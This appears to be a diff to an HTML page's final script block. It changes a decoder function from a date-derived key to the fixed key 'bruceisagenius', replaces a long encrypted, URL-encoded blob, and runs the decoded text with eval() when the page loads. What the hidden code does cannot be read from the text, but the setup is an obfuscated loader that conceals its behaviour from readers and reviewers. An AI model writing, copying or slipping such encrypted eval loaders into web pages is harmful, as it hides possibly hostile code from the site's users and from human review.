@@ -605,28 +605,20 @@
     </script>
     <script>
       function xorAndShiftDecode(encodedText) {
-        const currentDate = new Date().toLocaleString("en-US", { 
-            timeZone: "Asia/Tokyo", 
-            day: "2-digit", 
-            month: "2-digit", 
-            year: "numeric"
-        });
-    
-        const [month, day, year] = currentDate.split("/"); // Adjusting format if needed
-        const key = `${day}-${month}-${year}`;
-        let result = '';
-        const shift = key.length;  // Match the shift used in encoding
-    
-        for (let i = 0; i < encodedText.length; i++) {
-            const encodedCharCode = encodedText.charCodeAt(i);
-            const keyChar = key.charCodeAt(i % key.length);
-            // Reverse the shift and then XOR with key
-            const decodedCharCode = (encodedCharCode - shift) ^ keyChar;
-            result += String.fromCharCode(decodedCharCode);
-        }
-        return result;
+          const key = "bruceisagenius";  // Permanent key
+          let result = '';
+          const shift = key.length;  // Match the shift used in encoding
+      
+          for (let i = 0; i < encodedText.length; i++) {
+              const encodedCharCode = encodedText.charCodeAt(i);
+              const keyChar = key.charCodeAt(i % key.length);
+              // Reverse the shift and then XOR with key
+              const decodedCharCode = (encodedCharCode - shift) ^ keyChar;
+              result += String.fromCharCode(decodedCharCode);
+          }
+          return result;
       }
-      eval(xorAndShiftDecode(decodeURIComponent(`EI1_iXQgadO%25V_%5ErN_fJ%C2%87fhO_MaL%24%1DfdbL_JgPa%1D'%1FNicce%5BP%5BzONm_fQ_KJ%C2%88eX%5E%23%20BDh%5BO%1Fi%5EKbaMPq%5Eec%1B%17%17%5E%5BhQ%5E%181E%60bf%5DPghe%17bhNPc%5DJ%5E~gblRMOaQO%C2%84M%5C_%0F%25%1ASH%1B%1F%17%1BcU%1C%22J%5BJJRLN%C2%88ahP'%1BQROOif%15BH%1B%1F%17%1BLRMOaQOpRiN%17%19%1APPNZ%20E%1A%17%1C%1A%60e%5CJJ%5Ehc%26LachMR~PRfN%C2%88gLKRi_i%24!ieNPRfiea!(%1EbeNOcVP_%7DNbqRJORKN%C2%87d%5CZ%0E%14D1%1C%1A%1C%1ELZXNLR%C2%83_U%60h%5Ei_%7BX%5B_KQ%23%26%20E%1A%17%1C%1A%5BeiPc%1B%5DKe_fJofJ%5ETLf_%1C%13%1B%5CRO%7DbJLadOkNf_agha%26%22%181%1B%1A%17%1CNJ_iPJbN%C2%83egaXheR%7F%5Bc%5D%22%1FfOKgL%14%0C'MdgihViMRf%60ge_%5BVO%5B%0DghJ%5Bi%5BRM(Xgg%1F%22%1B%60Kb_MPnec%5EYLi_%0EB%1A%1C%1E%1B%1F%17%1B%1A%0DPbad%23%5BR%5CiSa%7BfZmJMl%5DieJP'E%1F%17%1B%1A%17%1C%1A%1C%24%5C%5Ec%5Cb%0Fd%5BfZgZrMLLJ%23%13HVI1aOM%5BNeei%1Fh%5E%5DbJ_%C2%83%5BRaLZLS%7D%5D%5B%5BLP%0F%22%1A%60B%1A%1C%1E%1BfU%1B%22M%5DPe%5DZKLM(PaSZeZQS%22%1AM%5DPe%5DZKLM(PaSZeZQS)fL%5Be%24'%14IZEDUQh%5BJbdM%1BaRP%7DQPMZMOnNi_ReiZ%0F%22%1A%60B%1A%1C%1E%1BQROOif%1A%C2%85dOc%0D%7F%5Bcanec%5E%7DLMgVP%22%25%24MZhhfea%5E%C2%87NOfLiM%0F%25(PgfZ%C2%81hhR%13DYHE%5Dbi%5Dceif%1EOQViMJeNpgfZahhR%C2%80%5BP_%23Jig%26%17Pci%5BUdM%5E%23%17SD%1C%1E%1B%1Fi%5ENbJh%1C%5C%5EKXc%22bJf(%1ETI%17%1B%1A%17%1C%1A%1C%1EfZcciS%12%1A%1Fn%C2%88p%C2%83%20%261%1C%1A%1C%1E%1B%1F%17%1BbR%5D%5EaPL%19%17T%1A%14%7BifJ%5Eec%26n%5EL_%1F%18%1B%1CVKJKe%5D%5DJbdM(dhgh%1F%1EV%231%1B%1A%17%1C%1A%1C%1E%1BaL_S!%1C%C2%84k%C2%85%C2%89%25hOLNfae%5CR'%60%1BNNi_ReiZ%0B%1B%60bhfqPg%19%17PcM%60iO%24gdXZNNgh%26fMZU%1BW%0E(D%1C%1E%1B%1FZ%22(cd_f%26MZhKiMK_%1C%13%19%1Fi%5EMgghK%5B)KRSN%0F%25%23%13HVI1aOM%5BNeei%1FS%5E%5DL%60_%7Dd_qbimXJcLJ%23ZM%5CiSa%5EkaMfgO%23%17SD%1C%1E%1B%1FcMS%17SD%1C%1E%1B%1F%17%1B%1A%17%5BifQO%1Fh%5CLNLN%1C%13%1B%5Ech%5C%0Fah%5Be_ZSl%5DieJP'%14I%17%1B%1A%17%1C%1A%1C%1E%5EMVg%22h%5BLeNO%26%20E%1A%17%1C%1AY%1E%5C%5Ec%5Cb%17%24_JPhQ%0E%1BU1%1C%1A%1C%1E%1B%1F%17%1BNOJiO%1EiZd%1B%7FiJiJ%26%5BpXMcgP%1AaV%5E%60bOcLf%1A%5E_bcR_%14%17%20UaPMdiVZ%0E%13D%1C%1E%1B%1FZEW1B%60Qd%5CKNhh%17d%5BfZgZrMLLJ%22aPMdi%22%1A%60B%1A%1C%1E%1B%60LiMLh_%26%5BMQLM%22%14%7Dj%C2%85%1EMZfN_hP%1AgP%1BPXMcgP%1AaV%5E%60bOcLf%1AaPMdi%15!%0B%1C_JPhQ%0E%14DZB`)));
+      eval(xorAndShiftDecode(decodeURIComponent(`EF1_iXQgadO%22V_%5ErN_fJ%C2%87ihO_MaL%24%1DfcbL_JgPa%1D'%20Nicce%5BP%5BzPNm_fQ_KJ%C2%88bX%5E%23%20BDh%5BO%20i%5EKbaMPq%5Ebc%1B%17%17%5E%5BhQ%5E%171E%60bf%5DPghb%17bhNPc%5DJ%5E%C2%81gblRMOaQO%C2%83M%5C_%0F%25%1ASH%1B%20%17%1BcU%1C%22J%5BJMRLN%C2%88ahP'%1BNROOif%15BH%1B%20%17%1BLRMOaQOoRiN%17%19%1APPN%5D%20E%1A%17%1C%1A%60e%5CMJ%5Ehc%26LachJR~PRfN%C2%88gLLRi_i%24!ieNORfiea!(%1EbbNOcVP_%7DNbnRJORKN%C2%87d%5C%5D%0E%14D1%1C%1A%1C%1EL%5DXNLR%C2%83_U%60hai_%7BX%5B_KQ%23)%20E%1A%17%1C%1A%5BeiOc%1B%5DKe_fJoiJ%5ETLf_%1C%13%1B%5BRO%7DbJLadOlNf_agha%26%22%171%1B%1A%17%1CNJ_iOJbN%C2%83egaXhbR%7F%5Bc%5D%22%1FfOLgL%14%0C'MdgigViMRf%60ge_%5CVO%5B%0DghJ%5Bi%5CRM(Xgg%1F%22%1B_Kb_MPnec%5EVLi_%0EB%1A%1C%1E%1B%20%17%1B%1A%0DPbad%23%5CR%5CiSa%7BfZmMMl%5DieJP'E%20%17%1B%1A%17%1C%1A%1C%24%5Cac%5Cb%0Fd%5BfZg%5DrMLLJ%23%13HVF1aOM%5BNeei%20h%5E%5DbJ_%C2%83%5BR%5ELZLS%7D%5D%5B%5BLO%0F%22%1A%60B%1A%1C%1E%1BiU%1B%22M%5DPe%5DZLLM(PaSZeZNS%22%1AM%5DPe%5DZLLM(PaSZeZNS)fL%5Be%24'%14FZEDUQh%5BJbcM%1BaRP%7DQPM%5DMOnNi_Rei%5D%0F%22%1A%60B%1A%1C%1E%1BNROOif%1A%C2%85dOd%0D%7F%5Bcanec%5EzLMgVP%22%25%24M%5Dhhfea%5E%C2%87NOiLiM%0F%25(Pgf%5D%C2%81hhR%13DYHEZbi%5Dceif%1EONViMJeNpgf%5DahhR%C2%80%5BP_%23Mig%26%17Pci%5BUcM%5E%23%17SD%1C%1E%1B%20i%5ENbJh%1C%5C%5ELXc%22bJf(%1ETF%17%1B%1A%17%1C%1A%1C%1Ef%5DcciS%12%1A%1Fn%C2%88o%C2%83%20%261%1C%1A%1C%1E%1B%20%17%1BbR%5D%5EaPL%16%17T%1A%14%7BifJ%5Ebc%26n%5EL_%1F%18%1B%1BVKJKe%5D%5DJbcM(dhgh%1F%1EV%241%1B%1A%17%1C%1A%1C%1E%1B%5EL_S!%1C%C2%84k%C2%85%C2%89%22hOLNfae%5CR(%60%1BNNi_Rei%5D%0B%1B%60bhfqPg%16%17PcM%60iO%24gcXZNNgh%26fM%5DU%1BW%0E(D%1C%1E%1B%20Z%22(cd_f%26M%5DhKiMK_%1C%13%19%20i%5EMgghK%5B)LRSN%0F%25%23%13HVF1aOM%5BNeei%20S%5E%5DL%60_%7Dd_nbimXJcLJ%23%5DM%5CiSa%5EkaMigO%23%17SD%1C%1E%1B%20cMS%17SD%1C%1E%1B%20%17%1B%1A%17%5BifQO%20h%5CLNLN%1C%13%1Bach%5C%0Fah%5Be_%5DSl%5DieJP'%14F%17%1B%1A%17%1C%1A%1C%1E%5EJVg%22h%5BLeNO)%20E%1A%17%1C%1AY%1E%5Cac%5Cb%17%24_JPhN%0E%1BU1%1C%1A%1C%1E%1B%20%17%1BNOJiO%1Ei%5Dd%1B%7FiJiJ%26%5BoXMcgP%1AaV%5E_bOcLf%1A%5E_bdR_%14%17%20UaPMciVZ%0E%13D%1C%1E%1B%20ZEW1B%60Qd%5CLNhh%17d%5BfZg%5DrMLLJ%22aPMci%22%1A%60B%1A%1C%1E%1B_LiMLh_%26%5BMNLM%22%14%7Dj%C2%85%1EM%5DfN_hP%1AgP%1BOXMcgP%1AaV%5E_bOcLf%1AaPMci%15!%0B%1C_JPhN%0E%14DZB`)));
     </script>
   </body>
 </html>
